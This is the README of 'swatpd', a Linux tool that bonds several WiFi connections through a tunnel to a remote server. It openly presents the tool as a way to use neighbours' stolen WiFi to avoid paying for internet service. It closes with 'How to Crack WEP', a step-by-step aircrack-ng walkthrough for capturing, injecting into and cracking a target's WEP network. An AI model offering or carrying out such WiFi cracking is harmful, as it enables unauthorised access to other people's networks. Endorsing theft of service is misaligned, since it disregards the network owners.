.. -*-rst-*-

========
 swatpd
========

------------------------------------------------
 Stolen WiFi Aggregate Tunneling Protocol Dæmon
------------------------------------------------

:Author: Justine Tunney
:Version: 0.1 pre-alpha
:Platform: Linux
:Copyright: (c) 2011 Justine Tunney
:License: GNU AGPL 3 or later
:Disclaimer: This program is a proof of concept


Description
===========

So you've expropriated every wireless network in your area, the only
problem is none of them work reliably... but what if you could use two
(or more) wireless hotspots simultaneously?  That way if one link
starts being unreliable or stops working, your internet will still
operate smoothly.

swatpd raids your internet connections together like they're hard
drives.  It works by tunneling your traffic to an external swatp
server, which then forwards it to the internet.  Tunnel traffic is
duplicated onto each of your wireless cards on a per-packet basis.
Whichever packet reaches the swatp server first wins, and duplicates
are discarded.  It's like having your own multi-homed BGP router
except with proactive, rather than reactive, reliability.

I created this program because I got frustrated with my internet
cutting out periodically for a few seconds at a time while while
raiding in World of Warcraft when my neighbor decides to download
porn.  I could have just started paying for an internet connection,
but fuck Comcast and Verizon.

What does it mean?

* Packet loss will decrease significantly.

* Downloads won't go any faster.

* Latency will increase because your packets need to bounce off the
  swatp server.

  For me this was about an extra 40ms round-trip time (how long it
  takes to ping my server) but in practice probably more like 30ms
  because the datacenter in which my server hosted has faster routes
  to most places than the local ISPs.

* Your IP address will be different since traffic is being bounced off
  the remote tunnel endpoint.

Another way to accomplish "double internet" is to use iptables
mark-based routing that randomly delegates tcp/udp streams to specific
routing tables configured to use separate internet connections along
with a script that monitors latency on each link to periodically
adjust marking probability.  The only problem with this is that I'm
forced to reconnect to WoW if one of the links goes down... or if both
links are sorta crappy, I'm still screwed.


Requirements
============

* A Linux machine

* Two or more WiFi cards, each connected to different hotspots.

  It's best if you configure each router to be on different channels
  to minimize interference.  Channels 1, 6, 11, and 14 do not
  interfere with each other.  It also helps to use 802.11a (instead of
  b/g/n) because it's less prone to interference.

* Somewhere to run the remote swatp endpoint.

  A dedicated server or VPS will do the trick.  If you have a friend
  with a fast, reliable internet connection and a Linux router, that
  will work too.  Most importantly, you want the server to be
  geographically close to where you live as to minimize any additional
  latency.

* You need to forward port 31337 on each wireless router.

* If both wireless routers use the same subnet (192.168.0.0/24) this
  could potentially cause problems.  The simplest way to address this
  problem is to configure the router to put your computer in the DMZ.


Usage Example
=============

Here's a setup with two wifi cards.  Both wireless routers were
configured to make "compy" the DMZ host (which means the router's DHCP
server assigns compy a public IP.)

Here's a diagram::

    24.1.1.10:31337 ==================================
       /\                                           ||
       || wlan0                                     \/
    +---------+  tun0            tun0 +----------+ eth0
    |  compy  |- - - - - - - - - - - -|  server  | 6.6.6.6:31337 ==> INTERNET
    +---------+  10.4.4.2    10.4.4.1 +----------+
       || wlan1                                     /\
       \/                                           ||
    24.2.2.20:31337 ==================================

Run the following commands on server as root::

    sysctl -w net.ipv4.ip_forward=1
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    swatpd reliable 10.4.4.1/24 31337 \
        eth0 24.1.1.10 31337 \
        eth0 24.2.2.20 31337

Run the following commands on compy as root::

    swatpd reliable 10.4.4.2/24 31337 \
        wlan0 6.6.6.6 31337 \
        wlan1 6.6.6.6 31337
    ip route change default via 10.4.4.1
    for f in /proc/sys/net/ipv4/conf/*/rp_filter; do
        echo 0 > $f
    done

This is compy's ``/etc/network/interfaces`` file::

    auto lo
    iface lo inet loopback

    auto wlan0
    iface wlan0 inet dhcp
        wireless-essid dd-wrt
        wireless-key restricted DEADBEEF66

    auto wlan1
    iface wlan1 inet dhcp
        wireless-essid linksys


Tips
====

If you want downloads to go fast try using "fast" instead of
"reliable" in the swatpd command.  This will round-robin load balance
packets across your connections.  This might not be a good idea if
your internet connections are the least bit unreliable.

You'll probably want to configure dhcpcd to use OpenDNS to avoid both
routers fighting over who gets to be the DNS server::

    echo 'prepend domain-name-servers 208.67.222.222;' \
        >>/etc/dhcp3/dhclient.conf

If you're using Ubuntu, the network manager will ruin everything.  You
should configure ``/etc/network/interfaces`` similar to what's in the
example section and then run the following commands::

    /etc/init.d/network-manager stop
    /etc/init.d/avahi-daemon stop
    /etc/init.d/networking restart


ToDo
====

* Shared-secret encryption

* Eliminate requirement for port forwarding

* Create a mode for faster internet that stripes packets across
  multiple wifi links rather than duplicating them.  For instance,
  right now we only support RAID1, we also want RAID0 and RAID5.

* IPv6 support


How to Crack WEP
================

Burn the latest Backtrack Linux ISO and buy an Alfa AWUS036H wireless
card.  Boot Backtrack with the wireless card and follow these
instructions.

Let's look for WEP routers on channel 6 to target::

    airmon-ng start wlan0 6
    airodump-ng -c 6 -t WEP -w output_wep wlan0

Authenticate to target in second terminal window::

    aireplay-ng -1 6000 -o 1 -q 10 -h <TARGET_MAC> -e <TARGET_SSID> wlan0

Inject packets in third terminal window::

    aireplay-ng -3 -h <TARGET_MAC> -e <TARGET_SSID> wlan0

Wait for first terminal window to collect 30,000 packets.  Stop
programs in all three terminals and run::

    aircrack-ng -b <TARGET_MAC> output_wep*.cap
